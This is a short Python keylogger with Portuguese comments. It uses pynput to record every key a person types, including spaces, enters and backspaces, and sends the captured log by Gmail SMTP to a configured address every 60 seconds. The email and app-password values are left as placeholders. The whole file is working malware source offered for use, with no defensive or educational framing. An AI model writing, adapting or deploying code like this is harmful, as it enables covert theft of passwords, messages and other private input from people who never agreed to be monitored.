#Enviando dados capturados remotamente para o email
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

#Configuração de e-mail
EMAIL_ORIGEM = "Seu email"
EMAIL_DESTINO = "Seu email"
SENHA_EMAIL = "Senha criada apenas para aplicativos pelo site #htpps://myacount.google.com/apppasswords"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(EMAIL_ORIGEM,SENHA_EMAIL)
        server.send_message(msg)
        server.quit()
    except Exception as e:
        print("Erro ao enviar", e)

    log = ""

    # Agendar o envio a cada 60 segundos
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log+= key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[<] "
        else:
            pass # Ignorar control, shift, etc...

# Iniciar o Keylogger e o envio automatico
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()
